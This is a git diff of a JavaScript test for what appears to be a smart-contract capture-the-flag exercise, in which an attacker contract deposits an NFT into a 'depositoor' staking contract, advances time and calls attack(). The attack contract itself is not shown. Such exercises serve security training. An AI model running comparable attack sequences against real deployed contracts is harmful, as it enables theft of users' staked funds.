@@ -42,10 +42,13 @@ describe(NAME, function () {
         // prettier-ignore
         it("conduct your attack here", async function () {
 			const attackerContractWithSignature=await attackerContract.connect(attackerWallet);
-			const depositoorContractWithSignature=await depositoorContract.connect(attackerWallet);
-			const rewardTokenContractWithSignature=await rewardTokenContract.connect(attackerWallet);
-			const rewardTokenBalance=await rewardTokenContract.balanceOf(depositoorContract.address);
-			console.log("contract reward token balance",rewardTokenBalance)
+            const attackerNFTBalance=await NFTToStakeContract.balanceOf(attackerContract.address);
+
+			console.log("contract reward token balance",attackerNFTBalance)
+            await attackerContractWithSignature.deposit(NFTToStakeContract.address, rewardTokenContract.address, depositoorContract.address)
+            await time.increase(3600000);
+
+            await attackerContractWithSignature.attack(); 
 
       });
 
